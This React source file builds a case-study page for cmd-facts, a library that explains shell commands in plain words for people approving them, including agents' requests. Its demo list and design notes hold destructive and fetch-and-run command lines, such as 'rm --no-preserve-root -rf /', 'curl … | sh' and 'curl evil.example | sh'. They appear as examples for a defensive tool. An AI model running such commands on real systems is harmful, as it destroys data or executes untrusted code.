import { useEffect, useMemo, useRef, useState } from "react";
import { effectsOf, explain, linePartsOf } from "cmd-facts";
import type { Role } from "cmd-facts";
import {
  ArrowUpRight,
  Cpu,
  FileText,
  Globe,
  Server,
  User,
  type LucideIcon,
} from "lucide-react";
import { getRouteApi } from "@tanstack/react-router";
import { useJson } from "@/components/home/pulse";
import type { RegistryCode } from "@/lib/registry-code";
import type { Project } from "@/lib/content";
import type { NpmRelease } from "@/routes/api/npm";
import {
  CaseHero,
  CaseSection,
  Decisions,
  NextProject,
} from "@/components/work/case";
import { cn } from "@/lib/utils";

/**
 * cmd-facts' signature: the real library, imported from npm and run in the
 * browser. Every panel on this page is a live `explain()` call — hover an
 * argument in the command and its slot in the sentence lights up, because
 * `parts` carries the command's own text apart from the row's words.
 */

type Explanation = ReturnType<typeof explain>;
type Part = NonNullable<Explanation["parts"]>[number];

const mono = "font-mono text-[0.88em]";

/** The library joins a slot's values with commas and a final "and". */
function joinValues(values: string[]) {
  if (values.length === 1) return values[0];
  return `${values.slice(0, -1).join(", ")} and ${values[values.length - 1]}`;
}

type Seg = { text: string; part?: number };

/**
 * Wrap each slot value where it appears in the typed line, so the command and
 * the sentence can highlight each other. Best-effort on purpose: a value the
 * line doesn't contain verbatim simply doesn't light up.
 */
function segmentLine(line: string, parts: Part[]): Seg[] {
  const marks: { start: number; end: number; part: number }[] = [];
  // A whole word beats a substring: the -o argument's install.sh, not the
  // URL's. A value that only ever appears inside another word still matches.
  const edge = (c: string | undefined) => c === undefined || /[\s"']/.test(c);
  const find = (v: string) => {
    let fallback = -1;
    for (let at = line.indexOf(v); at !== -1; at = line.indexOf(v, at + 1)) {
      if (marks.some((m) => at < m.end && at + v.length > m.start)) continue;
      if (edge(line[at - 1]) && edge(line[at + v.length])) return at;
      if (fallback === -1) fallback = at;
    }
    return fallback;
  };
  parts.forEach((p, i) => {
    if (p.kind !== "values") return;
    for (const v of p.values) {
      if (!v) continue;
      const at = find(v);
      if (at === -1) continue;
      marks.push({ start: at, end: at + v.length, part: i });
    }
  });
  marks.sort((a, b) => a.start - b.start);
  const segs: Seg[] = [];
  let pos = 0;
  for (const m of marks) {
    if (m.start > pos) segs.push({ text: line.slice(pos, m.start) });
    segs.push({ text: line.slice(m.start, m.end), part: m.part });
    pos = m.end;
  }
  if (pos < line.length) segs.push({ text: line.slice(pos) });
  return segs;
}

/** Effect words, coloured by what they do: look, leave marks, take away, hand over control. */
const EFFECT_COLOR: Record<string, string> = {
  read: "var(--cf-effect-read)",
  write: "var(--cf-effect-write)",
  create: "var(--cf-effect-write)",
  configure: "var(--cf-effect-write)",
  install: "var(--cf-effect-write)",
  delete: "var(--cf-effect-delete)",
  terminate: "var(--cf-effect-delete)",
  transmit: "var(--cf-effect-power)",
  execute: "var(--cf-effect-power)",
  elevate: "var(--cf-effect-power)",
};

const factLabel: Record<string, string> = {
  yes: "yes",
  no: "no",
  "with-backup": "with a backup",
  unknown: "unknown",
  none: "none",
  "known-host": "a known address",
  arbitrary: "anywhere",
  listens: "listens",
  admin: "admin",
  root: "root",
  verified: "verified",
  derived: "derived",
};

/** Names an argument's role in a small tip above it, and to screen readers. */
function RoleTip({ role }: { role: string }) {
  return (
    <>
      <span className="sr-only"> ({role})</span>
      <span
        aria-hidden
        className="pointer-events-none absolute -top-7 left-1/2 -translate-x-1/2 translate-y-1 whitespace-nowrap rounded-lg bg-ink px-2 py-1 font-sans text-[0.72rem] font-semibold leading-none text-sheet opacity-0 shadow-[var(--shadow-lift)] transition-[opacity,transform] duration-150 ease-out-quart group-hover/var:translate-y-0 group-hover/var:opacity-100 group-focus-visible/var:translate-y-0 group-focus-visible/var:opacity-100"
      >
        {role}
      </span>
    </>
  );
}

/** What to call an argument in its tip: the role, or the reduction a slot shows. */
function roleOf(part: Part | undefined): string | null {
  if (!part || part.kind !== "values") return null;
  return "show" in part && part.show === "host" ? "host" : (part.role ?? null);
}

function Explain({
  line,
  compact,
  preview,
  showRoles,
  className,
}: {
  line: string;
  /** The home card and hero fit: fewer fact chips, tighter spacing. */
  compact?: boolean;
  /** The home card only: no footnotes, so the panel fits a 4:3 card. */
  preview?: boolean;
  /** The playground: arguments render in the project green and name their role in a tip. */
  showRoles?: boolean;
  className?: string;
}) {
  const ex = useMemo(() => {
    try {
      return explain(line);
    } catch {
      return null;
    }
  }, [line]);
  const [hot, setHot] = useState<number | null>(null);

  if (!ex)
    return (
      <div
        role="group"
        aria-label={`What cmd-facts says about ${line}`}
        className={cn(
          "rounded-[24px] bg-sheet text-left shadow-[var(--shadow-tile)]",
          compact ? "p-4 sm:p-5" : "p-5 sm:p-7",
          className,
        )}
      >
        <p className="m-0 font-medium leading-snug text-ink">
          This line could not be read as a command.
        </p>
      </div>
    );
  const parts: Part[] = ex.parts ?? [{ kind: "text", text: ex.sentence }];
  const segs = segmentLine(line, parts);
  const facts = ex.facts;
  const effects = effectsOf(facts);

  const rows: { label: string; value: string }[] = [
    { label: "Reversible", value: factLabel[facts.reversible] },
    { label: "Network", value: factLabel[facts.network] },
    ...(compact
      ? []
      : [
          { label: "Privilege", value: factLabel[facts.privilege] },
          { label: "Repeat-safe", value: facts.repeatSafe ? "yes" : "no" },
        ]),
    { label: "Confidence", value: factLabel[facts.confidence] ?? "unknown" },
  ];

  const slot = (on: boolean) =>
    cn(
      "rounded-[0.35em] transition-colors duration-150",
      on && "bg-[color-mix(in_srgb,var(--cmd-facts)_32%,transparent)]",
    );

  return (
    <div
      role="group"
      aria-label={`What cmd-facts says about ${line}`}
      className={cn(
        "rounded-[24px] bg-sheet text-left shadow-[var(--shadow-tile)]",
        compact ? "p-4 sm:p-5" : "p-5 sm:p-7",
        className,
      )}
    >
      <p
        className={cn(
          mono,
          "m-0 whitespace-pre-wrap [overflow-wrap:anywhere] rounded-2xl bg-sheet-sunk px-4 py-3 leading-relaxed text-ink shadow-[inset_0_0_0_1px_var(--line)]",
        )}
      >
        <span aria-hidden className="select-none text-ink-3">
          ${" "}
        </span>
        {segs.map((s, i) =>
          s.part === undefined ? (
            <span key={i}>{s.text}</span>
          ) : (
            <span
              key={i}
              tabIndex={-1}
              onPointerEnter={() => setHot(s.part!)}
              onPointerLeave={() => setHot(null)}
              className={cn(
                slot(hot === s.part),
                "underline decoration-[color-mix(in_srgb,var(--cmd-facts)_70%,var(--ink))] decoration-2 underline-offset-[0.22em]",
                showRoles &&
                  "group/var relative text-[var(--cmd-facts-text)]",
              )}
            >
              {s.text}
              {showRoles && roleOf(parts[s.part]) && (
                <RoleTip role={roleOf(parts[s.part])!} />
              )}
            </span>
          ),
        )}
      </p>

      <p
        className={cn(
          "m-0 mt-4 leading-snug text-ink",
          compact
            ? "text-[1.02rem] font-medium"
            : "text-[clamp(1.1rem,1.6vw,1.3rem)] font-medium",
        )}
      >
        {parts.map((p, i) =>
          p.kind === "text" ? (
            <span key={i}>{p.text}</span>
          ) : (
            <span
              key={i}
              onPointerEnter={() => setHot(i)}
              onPointerLeave={() => setHot(null)}
              className={cn(
                mono,
                "font-semibold",
                slot(hot === i),
                showRoles && "group/var relative text-[var(--cmd-facts-text)]",
              )}
            >
              {joinValues(p.values)}
              {showRoles && roleOf(p) && <RoleTip role={roleOf(p)!} />}
            </span>
          ),
        )}
      </p>

      <dl
        className={cn(
          "m-0 flex flex-wrap gap-x-6 gap-y-2 border-t border-line",
          compact ? "mt-4 pt-3.5" : "mt-5 pt-4",
        )}
      >
        <div>
          <dt className="text-[0.76rem] font-medium text-ink-3">
            {facts.opaque ? "Effect, at least" : "Effect"}
          </dt>
          <dd className="m-0 text-[0.92rem] font-semibold">
            {effects.length
              ? effects.map((e, i) => (
                  <span key={e}>
                    {i > 0 && (
                      <span aria-hidden className="text-ink-3">
                        {" · "}
                      </span>
                    )}
                    <span
                      style={{
                        color: EFFECT_COLOR[e] ?? "var(--cmd-facts-text)",
                      }}
                    >
                      {e}
                    </span>
                  </span>
                ))
              : "—"}
          </dd>
        </div>
        {rows.map((r) => (
          <div key={r.label}>
            <dt className="text-[0.76rem] font-medium text-ink-3">{r.label}</dt>
            <dd className="m-0 text-[0.92rem] font-semibold text-ink">
              {r.value}
            </dd>
          </div>
        ))}
      </dl>

      {!preview && facts.opaque && (
        <p className="m-0 mt-3 text-[0.92rem] leading-relaxed text-ink-2">
          <strong className="font-semibold text-ink">Hands over to</strong>{" "}
          {facts.handsOverTo}. Past that point the fields are a floor, not a
          measurement.
        </p>
      )}
      {!preview && ex.unread && ex.unread.length > 0 && (
        <p className="m-0 mt-3 text-[0.92rem] leading-relaxed text-ink-2">
          <strong className="font-semibold text-ink">Not read</strong>{" "}
          {ex.unread.map((w, i) => (
            <span key={w}>
              {i > 0 && ", "}
              <code className={cn(mono, "text-ink")}>{w}</code>
            </span>
          ))}
          . The answer comes from the program's widest row instead of a
          guess.
        </p>
      )}
      {!compact && facts.note && (
        <p className="m-0 mt-3 text-[0.92rem] leading-relaxed text-ink-2">
          {facts.note}
        </p>
      )}
    </div>
  );
}

const EXAMPLES = [
  "curl -fsSL https://get.example.com/install.sh -o install.sh",
  "rm -rf node_modules",
  "curl https://get.example.com/install.sh | sh",
  "sudo rm -rf /var/tmp",
  "ls ~/Documents > listing.txt",
  "df -h",
  "rm --no-preserve-root -rf /",
];

/** Hero media: the panel working through real commands, one at a time. */
function HeroDemo() {
  const [index, setIndex] = useState(0);
  const picked = useRef(false);
  const frame = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (window.matchMedia("(prefers-reduced-motion: reduce)").matches) return;
    const id = setInterval(() => {
      if (picked.current) return;
      const el = frame.current;
      if (el && (el.matches(":hover") || el.contains(document.activeElement)))
        return;
      setIndex((i) => (i + 1) % EXAMPLES.length);
    }, 5000);
    return () => clearInterval(id);
  }, []);

  return (
    <div ref={frame}>
      <Explain line={EXAMPLES[index]} compact />
      <div
        className="mt-3 flex flex-wrap gap-1.5"
        role="group"
        aria-label="Example commands"
      >
        {EXAMPLES.map((line, i) => (
          <button
            key={line}
            type="button"
            aria-pressed={i === index}
            onClick={() => {
              picked.current = true;
              setIndex(i);
            }}
            className={cn(
              mono,
              "min-h-9 cursor-pointer rounded-full border-0 px-3 text-[0.72rem] font-medium transition-[background-color,transform] duration-150 ease-out-quart active:scale-[0.95]",
              i === index
                ? "bg-[var(--cmd-facts-deep)] text-[var(--cmd-facts)]"
                : "bg-[oklch(1_0_0/0.4)] text-[var(--cmd-facts-deep)] hover:bg-[oklch(1_0_0/0.7)]",
            )}
          >
            {line.split(" ")[0] === "curl" && line.includes("|")
              ? "curl | sh"
              : line.split(" ").slice(0, 2).join(" ")}
          </button>
        ))}
      </div>
    </div>
  );
}

/** The home card's face: one explained command, decorative. */
export function ExplainPreview() {
  return (
    <div aria-hidden className="pointer-events-none w-full">
      <Explain line="sudo rm -rf /var/tmp" compact preview />
    </div>
  );
}

function Playground() {
  const [value, setValue] = useState(EXAMPLES[0]);
  const line = value.trim();
  // What screen readers hear: just the sentence, and only once typing settles.
  const [announced, setAnnounced] = useState("");
  useEffect(() => {
    const id = setTimeout(() => {
      try {
        setAnnounced(line ? explain(line).sentence : "");
      } catch {
        setAnnounced("");
      }
    }, 600);
    return () => clearTimeout(id);
  }, [line]);
  return (
    <div className="rounded-[32px] bg-[var(--cmd-facts)] p-4 sm:p-8">
      <label
        htmlFor="cf-line"
        className="block px-1 pb-3 font-semibold text-[var(--cmd-facts-deep)]"
      >
        Type a command, or take one of these
      </label>
      <input
        id="cf-line"
        type="text"
        value={value}
        onChange={(e) => setValue(e.target.value)}
        autoComplete="off"
        autoCapitalize="off"
        spellCheck={false}
        placeholder="rm -rf /tmp/build"
        className={cn(
          mono,
          "block w-full rounded-2xl border-0 bg-[oklch(1_0_0/0.75)] px-5 py-4 text-[0.95rem] text-[var(--cmd-facts-deep)] shadow-[inset_0_0_0_1px_oklch(0_0_0/0.08)] outline-none transition-shadow duration-150",
          "placeholder:text-[color-mix(in_oklch,var(--cmd-facts-deep)_55%,var(--cmd-facts))]",
          "focus-visible:shadow-[inset_0_0_0_2px_var(--cmd-facts-deep)]",
        )}
      />
      <div className="mt-3 flex flex-wrap gap-1.5 px-1">
        {EXAMPLES.map((ex) => (
          <button
            key={ex}
            type="button"
            onClick={() => setValue(ex)}
            className={cn(
              mono,
              "min-h-9 cursor-pointer rounded-full border-0 bg-[oklch(1_0_0/0.4)] px-3 text-[0.74rem] font-medium text-[var(--cmd-facts-deep)] transition-[background-color,transform] duration-150 ease-out-quart hover:bg-[oklch(1_0_0/0.75)] active:scale-[0.95]",
            )}
          >
            {ex}
          </button>
        ))}
      </div>
      <div className="mt-4">
        {line ? (
          <Explain line={line} showRoles />
        ) : (
          <p className="m-0 px-1 py-6 text-center font-medium text-[var(--cmd-facts-deep)]">
            The panel answers as soon as there's a line to read.
          </p>
        )}
      </div>
      <span aria-live="polite" className="sr-only">
        {announced}
      </span>
      <p className="m-0 max-w-[70ch] px-1 pt-4 text-[0.9rem] leading-relaxed text-[var(--cmd-facts-deep)]">
        This is the published package, running in your browser. The table is
        early: a command it has no row for comes back as the widest floor, with
        a sentence that admits it. That honesty is the point.
      </p>
    </div>
  );
}

/** Clear beside opaque: the type-level story, told with two live rows. */
function ClearVsOpaque() {
  return (
    <div className="grid gap-5 lg:grid-cols-2 lg:gap-6">
      <figure className="m-0">
        <Explain line="curl -fsSL https://get.example.com/install.sh -o install.sh" />
        <figcaption className="mt-3 px-2 text-[0.92rem] text-ink-2">
          A clear row: the library can account for the whole command, so{" "}
          <code>effect</code> is a complete list.
        </figcaption>
      </figure>
      <figure className="m-0">
        <Explain line="sudo rm -rf /var/tmp" />
        <figcaption className="mt-3 px-2 text-[0.92rem] text-ink-2">
          An opaque row: <code>sudo</code> hands over, so there is no{" "}
          <code>effect</code> field at all — only <code>effectAtLeast</code>,
          and reading a complete list off it is a type error.
        </figcaption>
      </figure>
    </div>
  );
}

/**
 * The registry's sentence-by-role demo, rebuilt in this site's own type and
 * tokens: an approval prompt where each argument wears its role's colour on
 * the command line and in the sentence, and pointing at either lights both.
 * The pairing comes from `linePartsOf`, which labels the line word by word.
 */
const ROLE_ICON: Partial<Record<Role, LucideIcon>> = {
  url: Globe,
  host: Server,
  path: FileText,
  user: User,
  pid: Cpu,
};
const roleColor = (role: Role) =>
  role in ROLE_ICON ? `var(--cf-role-${role})` : "var(--cmd-facts-text)";

const PROMPT_LINE =
  "curl -o dump.sql https://db.example.com/export && chown alice dump.sql && ssh admin@db.internal";

/** Which words on the line each sentence value came from: the first unclaimed word of its role with the same text. */
function pairByRole(line: string, ex: Explanation) {
  const words = linePartsOf(line, ex);
  const wordPart = new Map<number, number>();
  const partWord = new Map<number, number>();
  const strip = (t: string) => t.replace(/^(['"])(.*)\1$/, "$2");
  (ex.parts ?? []).forEach((p, i) => {
    if (p.kind !== "values") return;
    for (const want of p.written ?? p.values) {
      const at = words.findIndex(
        (w, j) =>
          w.kind === "value" &&
          w.role === p.role &&
          !wordPart.has(j) &&
          strip(w.text) === want,
      );
      if (at === -1) continue;
      wordPart.set(at, i);
      if (!partWord.has(i)) partWord.set(i, at);
    }
  });
  return { words, wordPart };
}

function RolePrompt({ className }: { className?: string }) {
  const ex = useMemo(() => explain(PROMPT_LINE), []);
  const { words, wordPart } = useMemo(() => pairByRole(PROMPT_LINE, ex), [ex]);
  const parts = ex.parts ?? [{ kind: "text" as const, text: ex.sentence }];
  const [hot, setHot] = useState<number | null>(null);
  const [answer, setAnswer] = useState<"allowed" | "denied" | null>(null);
  const wash = (role: Role, on: boolean) =>
    on
      ? `color-mix(in oklch, ${roleColor(role)} 22%, transparent)`
      : "transparent";

  return (
    <div
      className={cn(
        "w-full rounded-[24px] bg-sheet p-5 text-left shadow-[var(--shadow-tile)] sm:p-7",
        className,
      )}
    >
      <p className="m-0 text-[1.25rem] font-semibold tracking-[-0.01em] text-ink">
        Allow this command?
      </p>
      <p className="m-0 mt-1 text-[0.92rem] text-ink-2">
        An agent wants to run:
      </p>

      <p
        className={cn(
          mono,
          "m-0 mt-3 whitespace-pre-wrap [overflow-wrap:anywhere] rounded-2xl bg-sheet-sunk px-4 py-3 leading-relaxed text-ink-2 shadow-[inset_0_0_0_1px_var(--line)]",
        )}
      >
        {words.map((w, j) => {
          const part = wordPart.get(j);
          if (w.kind === "value") {
            const on = part !== undefined && hot === part;
            return (
              <span
                key={j}
                onPointerEnter={() => part !== undefined && setHot(part)}
                onPointerLeave={() => setHot(null)}
                className="rounded-[0.35em] font-semibold transition-colors duration-150"
                style={{
                  color: roleColor(w.role),
                  backgroundColor: wash(w.role, on),
                }}
              >
                {w.text}
              </span>
            );
          }
          return (
            <span
              key={j}
              className={cn(
                w.kind === "program" && "font-semibold text-ink",
                w.kind === "operator" && "text-ink-3",
              )}
            >
              {w.text}
            </span>
          );
        })}
      </p>

      <p className="m-0 mt-4 text-[clamp(1.05rem,1.5vw,1.2rem)] font-medium leading-relaxed text-ink">
        {parts.map((p, i) => {
          if (p.kind === "text") return <span key={i}>{p.text}</span>;
          const Icon = ROLE_ICON[p.role];
          const written = (p.written ?? p.values).join(", ");
          return (
            <span
              key={i}
              tabIndex={0}
              title={`${p.role}: ${written}`}
              aria-label={`${joinValues(p.values)} (${p.role}: ${written})`}
              onPointerEnter={() => setHot(i)}
              onPointerLeave={() => setHot(null)}
              onFocus={() => setHot(i)}
              onBlur={() => setHot(null)}
              className={cn(
                mono,
                "inline-flex items-baseline gap-1 rounded-[0.35em] px-0.5 font-semibold underline decoration-dotted decoration-2 underline-offset-[0.25em] outline-none transition-colors duration-150 focus-visible:shadow-[0_0_0_2px_var(--ink)]",
              )}
              style={{
                color: roleColor(p.role),
                textDecorationColor: roleColor(p.role),
                backgroundColor: wash(p.role, hot === i),
              }}
            >
              {Icon && (
                <Icon
                  aria-hidden
                  className="size-[0.85em] shrink-0 self-center"
                  strokeWidth={2.25}
                />
              )}
              {joinValues(p.values)}
            </span>
          );
        })}
      </p>

      <p className="m-0 mt-3 text-[0.84rem] text-ink-3">
        Point at an underlined value or a coloured word to see its pair.
      </p>

      <div className="mt-5 flex min-h-11 flex-wrap items-center justify-end gap-2 border-t border-line pt-4">
        <span aria-live="polite" className="mr-auto font-semibold text-ink">
          {answer === "allowed"
            ? "Allowed."
            : answer === "denied"
              ? "Denied."
              : ""}
        </span>
        {answer ? (
          <button
            type="button"
            onClick={() => setAnswer(null)}
            className="min-h-11 cursor-pointer rounded-full border-0 bg-sheet-sunk px-5 font-semibold text-ink transition-[background-color,transform] duration-150 ease-out-quart hover:bg-line active:scale-[0.96] focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-ink"
          >
            Reset
          </button>
        ) : (
          <>
            <button
              type="button"
              onClick={() => setAnswer("denied")}
              className="min-h-11 cursor-pointer rounded-full border-0 bg-sheet-sunk px-5 font-semibold text-ink transition-[background-color,transform] duration-150 ease-out-quart hover:bg-line active:scale-[0.96] focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-ink"
            >
              Deny
            </button>
            <button
              type="button"
              onClick={() => setAnswer("allowed")}
              className="min-h-11 cursor-pointer rounded-full border-0 bg-ink px-5 font-semibold text-sheet transition-[opacity,transform] duration-150 ease-out-quart hover:opacity-90 active:scale-[0.96] focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-ink"
            >
              Allow
            </button>
          </>
        )}
      </div>
    </div>
  );
}

const route = getRouteApi("/work/$slug");

type View = "prompt" | "demo" | "install";

/** Tabs that move with the arrow keys, as a tablist should. */
function Tabs({
  label,
  items,
  value,
  onChange,
  idPrefix,
  className,
  tabClassName,
}: {
  label: string;
  items: readonly { key: View; label: string }[];
  value: View;
  onChange: (v: View) => void;
  idPrefix: string;
  className?: string;
  tabClassName: (on: boolean) => string;
}) {
  const refs = useRef<(HTMLButtonElement | null)[]>([]);
  const at = Math.max(
    0,
    items.findIndex((t) => t.key === value),
  );
  const move = (by: number) => {
    const next = (at + by + items.length) % items.length;
    onChange(items[next].key);
    refs.current[next]?.focus();
  };
  return (
    <div
      role="tablist"
      aria-label={label}
      className={className}
      onKeyDown={(e) => {
        if (e.key === "ArrowRight") move(1);
        if (e.key === "ArrowLeft") move(-1);
      }}
    >
      {items.map((t, i) => (
        <button
          key={t.key}
          ref={(el) => {
            refs.current[i] = el;
          }}
          type="button"
          role="tab"
          id={`${idPrefix}-${t.key}`}
          aria-selected={i === at}
          tabIndex={i === at ? 0 : -1}
          onClick={() => onChange(t.key)}
          className={tabClassName(i === at)}
        >
          {t.label}
        </button>
      ))}
    </div>
  );
}

/**
 * The registry's own source for the prompt beside it, trimmed, plus the
 * install line. Highlighted on the server; on wide screens the panel takes
 * the prompt's height and scrolls inside it.
 */
function CodePanel({
  code,
  view,
  onView,
  className,
}: {
  code: RegistryCode;
  view: View;
  onView: (v: View) => void;
  className?: string;
}) {
  const shown = view === "install" ? "install" : "demo";
  return (
    <div className={cn("relative lg:min-h-0", className)}>
      {/* No card of its own: the tabs' card on phones, the prompt's on wide screens, with a line between. */}
      <div
        className={cn(
          "flex flex-col overflow-hidden bg-sheet text-left lg:absolute lg:inset-0 lg:h-auto lg:border-l lg:border-line",
          // The install line is short: on phones the panel fits it rather than holding the file's height.
          shown === "demo" && "h-[480px]",
        )}
      >
        <div className="flex min-h-[3.25rem] items-center gap-1 border-b border-line px-3 py-2">
          {/* On phones the tabs above the panel do this. */}
          <Tabs
            label="Source"
            idPrefix="cf-code-tab"
            items={[
              { key: "demo", label: "page.tsx" },
              { key: "install", label: "Install" },
            ]}
            value={shown}
            onChange={onView}
            className="hidden gap-1 lg:flex"
            tabClassName={(on) =>
              cn(
                mono,
                "min-h-9 cursor-pointer rounded-full border-0 px-3 text-[0.78rem] font-medium transition-[background-color,color,transform] duration-150 ease-out-quart active:scale-[0.96] focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-ink",
                on
                  ? "bg-sheet-sunk text-ink"
                  : "bg-transparent text-ink-3 hover:text-ink",
              )
            }
          />
          <a
            href="https://github.com/david-sling/cmd-facts/blob/main/web/src/registry/examples/sentence-by-role-demo.tsx"
            target="_blank"
            rel="noreferrer"
            className="ml-auto inline-flex min-h-9 items-center gap-1 rounded-full px-3 text-[0.8rem] font-medium text-ink-2 no-underline transition-colors duration-150 hover:text-ink"
          >
            Full file
            <ArrowUpRight aria-hidden className="size-3.5" />
          </a>
        </div>
        <div
          role="tabpanel"
          aria-label={shown === "install" ? "Install" : "page.tsx"}
          tabIndex={0}
          className="code-sheet min-h-0 flex-1 overflow-auto outline-none focus-visible:shadow-[inset_0_0_0_2px_var(--ink)]"
          dangerouslySetInnerHTML={{ __html: code[shown] }}
        />
      </div>
    </div>
  );
}

/**
 * The registry section's wide area, on the project's green. Wide screens put
 * the prompt beside its source; phones get one panel at a time, behind three
 * tabs. Both panels stay mounted, so a decision survives a tab switch.
 */
function RegistryShowcase() {
  const { code } = route.useLoaderData();
  const [view, setView] = useState<View>("prompt");
  const link =
    "inline-flex min-h-11 items-center gap-1.5 rounded-full bg-[oklch(1_0_0/0.45)] px-4 text-[0.9rem] font-semibold text-[var(--cmd-facts-deep)] no-underline transition-[background-color,transform] duration-150 ease-out-quart hover:bg-[oklch(1_0_0/0.75)] active:scale-[0.96]";
  return (
    <div className="rounded-[32px] bg-[var(--cmd-facts)] p-4 sm:p-8">
      <div
        className={cn(
          code &&
            "overflow-hidden rounded-[24px] bg-sheet shadow-[var(--shadow-tile)] lg:overflow-visible lg:rounded-none lg:bg-transparent lg:shadow-none",
        )}
      >
        {code && (
          <Tabs
            label="Demo and source"
            idPrefix="cf-view-tab"
            items={[
              { key: "prompt", label: "Demo" },
              { key: "demo", label: "Code" },
              { key: "install", label: "Install" },
            ]}
            value={view}
            onChange={setView}
            className="flex border-b border-line lg:hidden"
            tabClassName={(on) =>
              cn(
                "min-h-12 flex-1 cursor-pointer border-0 px-3 text-[0.9rem] font-semibold transition-[background-color,color] duration-150 ease-out-quart focus-visible:outline-2 focus-visible:-outline-offset-2 focus-visible:outline-ink",
                on
                  ? "bg-sheet text-ink"
                  : "bg-sheet-sunk text-ink-3 hover:text-ink",
              )
            }
          />
        )}
        <div
          className={cn(
            // minmax(0, …): the code's longest line must scroll, not widen the column.
            "grid grid-cols-[minmax(0,1fr)]",
            code
              ? "lg:grid-cols-[minmax(0,1fr)_minmax(0,1fr)] lg:gap-0 lg:overflow-hidden lg:rounded-[24px] lg:bg-sheet lg:shadow-[var(--shadow-tile)]"
              : "mx-auto max-w-[640px]",
          )}
        >
          <div className={cn(code && view !== "prompt" && "hidden lg:block")}>
            <RolePrompt className={cn(code && "rounded-none shadow-none")} />
          </div>
          {code && (
            <CodePanel
              code={code}
              view={view}
              onView={setView}
              className={cn(view === "prompt" && "hidden lg:block")}
            />
          )}
        </div>
      </div>
      <div className="mt-4 flex flex-wrap items-center gap-2">
        <a
          className={link}
          href="https://cmd-facts.davidsling.in/react"
          target="_blank"
          rel="noreferrer"
        >
          The components
          <ArrowUpRight aria-hidden className="size-4" />
        </a>
        <a
          className={link}
          href="https://v0.dev/chat/api/open?url=https%3A%2F%2Fcmd-facts.davidsling.in%2Fr%2Fsentence-by-role-demo.json"
          target="_blank"
          rel="noreferrer"
        >
          Open this demo in v0
          <ArrowUpRight aria-hidden className="size-4" />
        </a>
      </div>
    </div>
  );
}

/** The hero's status fact, with the version read live from npm rather than written into the page. */
function LatestRelease() {
  const release = useJson<NpmRelease>("/api/npm?package=cmd-facts");
  return release.status === "ready" && release.data ? (
    <>Early — v{release.data.version} on npm</>
  ) : (
    <>Early, on npm</>
  );
}

export function CmdFactsCase({ project }: { project: Project }) {
  return (
    <>
      <CaseHero
        project={project}
        facts={[
          { label: "Role", value: "Designed and built it" },
          { label: "Status", value: <LatestRelease /> },
          { label: "Stack", value: "TypeScript, zero dependencies" },
          { label: "Licence", value: "MIT" },
        ]}
        media={<HeroDemo />}
        jump={{ label: "Try it", href: "#playground" }}
      />

      <CaseSection id="why" title="Why I built it">
        <p>
          I ran into this building Valet. Valet ends at an approval prompt: an
          agent wants to run a command on a machine you own, and you decide.
          The prompt can show the command itself, which is honest — and no
          help at all if you've never opened a terminal. Valet needed a plain
          sentence under that command.
        </p>
        <p>
          But that reader is everywhere, not just in Valet: a customer
          clicking Allow in a remote support session, a release manager
          signing off a CI gate, an agent asking before it runs a tool, an
          admin console logging who approved what. Everything they're shown
          should answer one question:{" "}
          <strong>if this runs, what happens to this computer?</strong>
        </p>
        <p>
          So it became a library rather than a Valet feature. Not a man-page
          browser, not a linter — structured facts about what a command does,
          written for the person who has to approve it and didn't write it.
          Wiring it into Valet's own prompt is next.
        </p>
      </CaseSection>

      <CaseSection
        id="schema"
        title="The schema is the deliverable"
        wide={<ClearVsOpaque />}
      >
        <p>
          <code>explain()</code> returns fields — <code>effect</code>,{" "}
          <code>reversible</code>, <code>network</code>, <code>privilege</code>
          , <code>confidence</code>. The plain-English sentence is one
          rendering of those fields, not the deliverable. A consumer that colours a
          button or gates a policy reads the fields; only a consumer that has
          to talk to a person reads the sentence.
        </p>
        <p>
          The honest part is what happens when the library <em>can't</em> see.{" "}
          <code>sh -c</code>, <code>xargs</code>, <code>sudo</code>,{" "}
          <code>npm install</code> all hand over to code that isn't on the
          line. An opaque row has <strong>no effect field at all</strong> — it
          has <code>effectAtLeast</code> and names what it handed over to, so
          claiming completeness about a command nobody read is a compile error
          rather than a quiet mistake.
        </p>
        <p>
          Argument text is attacker-controlled, so the sentence also ships
          unjoined: <code>parts</code> carries the row's words and the
          command's own text separately. Hover an argument in any panel on
          this page — that pairing is <code>parts</code> doing its job.
        </p>
      </CaseSection>

      <CaseSection
        id="registry"
        title="React, as a shadcn registry"
        wide={<RegistryShowcase />}
      >
        <p>
          The components that render all this ship as a shadcn registry, not
          inside the package. One command copies the source into your project,
          where it takes your theme and is yours to change, and the library
          itself stays at zero dependencies.
        </p>
        <p>
          The sentence component takes the command and nothing else.{" "}
          <code>linePartsOf</code> labels the line word by word, so the same
          role can be coloured in both places: the address it reaches, the
          machine, the file, the person. Below is the registry's by-role
          demo, redrawn in this site's type, beside a trimmed copy of its
          source.
        </p>
      </CaseSection>

      <CaseSection id="decisions" title="The decisions that mattered">
        <p>
          Most of what shaped cmd-facts is refusals. Each one is something a
          neighbouring tool would happily ship.
        </p>
        <Decisions
          items={[
            {
              title: "No risk score",
              body: (
                <p>
                  Risk depends on the target, not the command:{" "}
                  <code>rm</code> on a build folder and <code>rm</code> on a
                  home folder are the same command. A number shipped here would
                  be used as policy, and it would be wrong. Facts here, scoring
                  at the consumer, which knows the target.
                </p>
              ),
            },
            {
              title: "No model at run time, now or later",
              body: (
                <p>
                  In an approval prompt the command line is
                  attacker-controlled, and a small model is steerable by
                  filenames. The failure mode is a fluent, reassuring sentence
                  above a dangerous command. If a heuristic would raise
                  coverage, the library returns nothing instead and says so.
                </p>
              ),
            },
            {
              title: "No discovery",
              body: (
                <p>
                  Extra command tables (packs) have to be named in the
                  consumer's own source. No JSON directory, no environment
                  variable, no <code>node_modules</code> scan: anyone who
                  could drop in a file could relabel{" "}
                  <code>curl evil.example | sh</code> as "checks how much room
                  is left on each disk".
                </p>
              ),
            },
            {
              title: "Trust is the consumer's decision, never the pack's",
              body: (
                <p>
                  A row from a pack the consumer didn't vouch for arrives at
                  lowered confidence, through a merge that can only widen a
                  claim, never soften it. A consumer gating on{" "}
                  <code>verified</code> never auto-approves a claim nobody
                  stands behind.
                </p>
              ),
            },
            {
              title: "What wasn't read is named, not guessed",
              body: (
                <p>
                  A flag no row was written for, or a word the shell would
                  rewrite into one (<code>$OPTS</code>, <code>{"{-o,x}"}</code>
                  ), isn't assumed harmless. The line is answered from the
